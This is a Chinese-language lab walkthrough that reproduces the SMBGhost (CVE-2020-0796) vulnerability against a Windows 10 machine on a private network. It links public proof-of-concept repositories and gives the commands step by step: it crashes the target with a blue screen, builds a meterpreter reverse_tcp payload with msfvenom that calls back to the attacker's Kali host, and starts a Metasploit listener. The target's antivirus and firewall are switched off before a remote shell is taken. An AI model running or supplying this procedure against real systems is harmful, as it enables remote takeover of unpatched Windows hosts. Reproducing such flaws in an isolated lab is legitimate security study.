    三、永恒之黑漏洞复现
    （一）
    1.下载工具
    工具下载地址：https://github.com/eerykitty/CVE-2020-0796-PoC
    2.解压工具并打开工具文件夹，右击在这里打开终端

    3.打开kali终端后输入命令进行模块安装
    pip install ntlm_auth

    4.输入下列命令
    ./CVE-2020-0796.py 192.168.136.143
    输入后靶机windows10蓝屏

    （二）
    1.首先把工具下载好
    工具下载地址：https://github.com/chompie1337/SMBGhost_RCE_PoC

    2.下载好之后解压出来

    3.打开解压后的文件夹，在空白处右键点击在这里打开终端

    4.打开终端后输入下面命令
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.136.132 LPORT=5555 -b ‘\x00’ -i 1 -f python > exploit

    （LHOST=后面填写的ip地址为本机kali的ip地址）
    5.将生成的exploit文件中的buf替换为USER_PAYLOAD
    vi exploit
    :%s/buf/USER_PAYLOAD
    :wq

    6.将exploit中的内容替换到exploit.py的相应位置

    7.输入下列命令配置msf并进行监听
    msfconsole
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    show options
    set lhost 192.168.136.132
    set lport 5555
    run


    8.进入windows10，打开设置

    9.下拉到最底下，点击更新与安全

    10.点击Windows安全中心

    11.将病毒和威胁防护与防火墙和网络保护里面的防护措施全部关闭



    12.win+r输入cmd，进入终端后输入ipconfig查看ip地址


    13.在kali中刚刚的终端空白处右击，然后点击水平布局终端

    14.运行刚刚修改好的exploit.py文件

    15.成功连接，输入shell获取控制权

    16.发现显示出现乱码，输入chcp 65001进行优化
